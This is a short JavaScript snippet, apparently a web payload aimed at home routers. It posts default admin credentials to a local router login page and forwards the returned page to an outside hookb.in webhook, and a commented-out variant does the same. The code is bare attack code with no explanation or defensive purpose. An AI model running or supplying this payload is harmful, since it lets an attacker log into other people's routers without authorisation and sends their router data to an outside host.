const http = new XMLHttpRequest();
http.open('POST', 'http://router.local/login.php', true);
// http.addEventListener('load', function (event) {
//     const xhr = new XMLHttpRequest();
//     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
//     xhr.setRequestHeader('Content-type', 'application/json');
//     xhr.send(JSON.stringify(http.responseText));
// });
http.onload = function () {
    if (http.readyState === http.DONE) {
        if (http.status === 200) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://hookb.in/9XowRPn7byCW1OXXwdWQ', true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(JSON.stringify(http.responseText));
        }
    }
};
//http.open('GET', 'http://router.local/login.php/');
//"username=root&pin=admin¬Robot=on"
http.send("username=admin&pin=admin");
